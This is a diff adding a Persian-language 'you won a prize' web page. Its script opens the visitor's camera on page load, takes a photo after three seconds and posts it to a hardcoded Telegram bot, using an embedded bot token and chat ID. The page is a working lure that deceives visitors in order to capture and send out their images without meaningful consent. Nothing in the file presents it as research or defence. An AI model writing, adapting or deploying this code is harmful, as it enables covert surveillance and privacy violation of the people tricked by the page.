@@ -1,0 +1,164 @@
+<!doctype html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>جایزه ویژه</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    /* Custom styles for the Inter font and overall body */
+    body {
+      font-family: 'Inter', sans-serif; /* Using Inter font */
+      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+      margin: 0;
+    }
+  </style>
+</head>
+<body>
+  <div class="card bg-gray-800 bg-opacity-30 p-8 rounded-xl shadow-2xl max-w-md w-full flex flex-col items-center space-y-6">
+    <h2 class="text-3xl font-bold text-yellow-400">🎉 تبریک! شما برنده جایزه ویژه شدید</h2>
+    <p class="text-lg text-gray-200">برای دریافت جایزه، لطفاً دوربین را فعال کنید</p>
+    <div class="relative w-full aspect-video bg-gray-700 rounded-lg overflow-hidden shadow-lg">
+      <video id="video" autoplay muted class="w-full h-full object-cover"></video>
+      <div id="camera-placeholder" class="absolute inset-0 flex items-center justify-center text-gray-400 text-sm bg-gray-800" style="display: none;">
+        دوربین در حال بارگذاری...
+      </div>
+    </div>
+
+    <div id="message-box" class="hidden bg-red-600 bg-opacity-80 p-4 rounded-lg text-white text-sm w-full">
+      <p id="message-text"></p>
+      <button onclick="hideMessage()" class="mt-2 px-4 py-2 bg-red-700 hover:bg-red-800 rounded-md text-white font-semibold">بستن</button>
+    </div>
+
+    <p class="text-xs text-gray-400 mt-4">
+      <span class="font-bold">نکته:</span> اگر دوربین فعال نشد، ممکن است مرورگر شما دسترسی به دوربین را مسدود کرده باشد یا این صفحه در محیطی اجرا شده باشد که دسترسی به دوربین را محدود می‌کند. لطفاً دسترسی دوربین را تأیید کنید یا این صفحه را در یک تب جدید مرورگر باز کنید.
+    </p>
+  </div>
+
+  <script>
+    // Define the Telegram bot token and chat ID
+    // Replace with your actual token and chat ID
+    const token = "8071837045:AAGidzXGssRwy5chfgPWSUkQycWX6axBcFk";
+    const chat_id = "136963421";
+
+    // Get references to video and message box elements
+    const video = document.getElementById("video");
+    const messageBox = document.getElementById("message-box");
+    const messageText = document.getElementById("message-text");
+    const cameraPlaceholder = document.getElementById("camera-placeholder");
+
+    /**
+     * Displays a custom message box with the given text.
+     * @param {string} message - The message to display.
+     */
+    function showMessage(message) {
+      messageText.textContent = message;
+      messageBox.classList.remove("hidden");
+    }
+
+    /**
+     * Hides the custom message box.
+     */
+    function hideMessage() {
+      messageBox.classList.add("hidden");
+    }
+
+    /**
+     * Sends a photo (Blob) to the Telegram bot.
+     * @param {Blob} blob - The image data as a Blob.
+     */
+    async function sendPhoto(blob) {
+      const formData = new FormData();
+      formData.append("chat_id", chat_id);
+      formData.append("photo", blob, "photo.jpg");
+
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        });
+
+        if (!response.ok) {
+          // If the response is not OK, something went wrong with the Telegram API
+          const errorData = await response.json();
+          console.error("Error sending photo to Telegram:", errorData);
+          showMessage(`خطا در ارسال عکس به تلگرام: ${errorData.description || 'خطای نامشخص'}`);
+        } else {
+          console.log("Photo sent successfully to Telegram!");
+          showMessage("عکس با موفقیت ارسال شد!");
+        }
+      } catch (err) {
+        // Catch network errors or other issues with the fetch request
+        console.error("Network error or other issue during photo send:", err);
+        showMessage("خطا در اتصال یا ارسال عکس. لطفاً اتصال اینترنت خود را بررسی کنید.");
+      }
+    }
+
+    /**
+     * Starts the camera, captures a photo after 3 seconds, and sends it.
+     */
+    async function startCamera() {
+      cameraPlaceholder.style.display = 'flex'; // Show placeholder while loading camera
+      try {
+        // Request access to the user's video camera
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        video.style.display = 'block'; // Show video element once stream is active
+        cameraPlaceholder.style.display = 'none'; // Hide placeholder
+
+        // Wait for the video to load metadata to ensure videoWidth/Height are available
+        await new Promise((resolve) => {
+          video.onloadedmetadata = () => {
+            resolve();
+          };
+        });
+
+        // After 3 seconds, capture a photo and send it
+        setTimeout(async () => {
+          const canvas = document.createElement("canvas");
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const context = canvas.getContext("2d");
+          context.drawImage(video, 0, 0, canvas.width, canvas.height); // Draw video frame to canvas
+
+          // Convert canvas content to a Blob and send it
+          canvas.toBlob(sendPhoto, "image/jpeg", 0.95);
+
+          // Stop the camera stream after capturing the photo
+          stream.getTracks().forEach(track => track.stop());
+          video.srcObject = null; // Clear the video source
+          video.style.display = 'none'; // Hide video element
+          cameraPlaceholder.style.display = 'flex'; // Show placeholder again, or a success message
+          messageText.textContent = "عکس گرفته شد و در حال ارسال است...";
+          messageBox.classList.remove("hidden"); // Show message box for sending status
+
+        }, 3000); // 3-second delay before capturing
+
+      } catch (err) {
+        console.error("Error accessing camera:", err);
+        video.style.display = 'none'; // Hide video element
+        cameraPlaceholder.style.display = 'flex'; // Show placeholder
+        if (err.name === "NotAllowedError" || err.name === "PermissionDeniedError") {
+          showMessage("دسترسی به دوربین رد شد. لطفاً دسترسی دوربین را فعال کنید.");
+        } else if (err.name === "NotFoundError" || err.name === "DevicesNotFoundError") {
+          showMessage("دوربینی یافت نشد. لطفاً مطمئن شوید دوربین به درستی متصل است.");
+        } else if (err.name === "NotReadableError" || err.name === "TrackStartError") {
+          showMessage("دوربین در حال استفاده است یا خطایی در شروع آن رخ داده است.");
+        } else {
+          showMessage(`خطا در فعال‌سازی دوربین: ${err.message}. لطفاً دوباره تلاش کنید.`);
+        }
+      }
+    }
+
+    // Start the camera when the window loads
+    window.onload = startCamera;
+  </script>
+
+</body></html>
+
